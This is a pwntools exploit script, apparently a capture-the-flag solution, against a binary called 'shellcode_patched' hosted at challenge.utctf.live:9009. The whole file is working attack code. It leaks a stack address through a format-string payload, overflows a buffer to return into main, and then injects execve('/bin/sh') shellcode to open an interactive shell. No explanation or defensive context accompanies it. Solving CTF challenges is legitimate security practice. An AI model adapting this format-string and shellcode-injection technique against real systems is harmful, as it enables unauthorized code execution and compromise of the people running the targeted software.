from pwn import *
from icecream import ic

elf = exe = ELF("./shellcode_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("challenge.utctf.live", 9009)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x400724
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a, drop = True)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

payload = b'%23$p.'
payload = payload.ljust(0x28, b'a')
payload += p64(0)
payload += p64(elf.bss()+0x100)
payload += p64(0)*2
payload += p64(exe.sym['main'])
sla(b'<Insert prompt here>: \n', payload)

stack_leak = int(ru("."), 16) - 0x118 + 0x50

payload = b'a'*0x30
payload += p64(elf.bss()+0x100)
payload += p64(0)*2
payload += p64(stack_leak)
payload += asm('''mov rax, 59
lea rdi, [rip+binsh]
mov rsi, 0
mov rdx, 0
syscall
binsh:
    .string "/bin/sh"
''')
sla(b'<Insert prompt here>: \n', payload)

io.interactive()
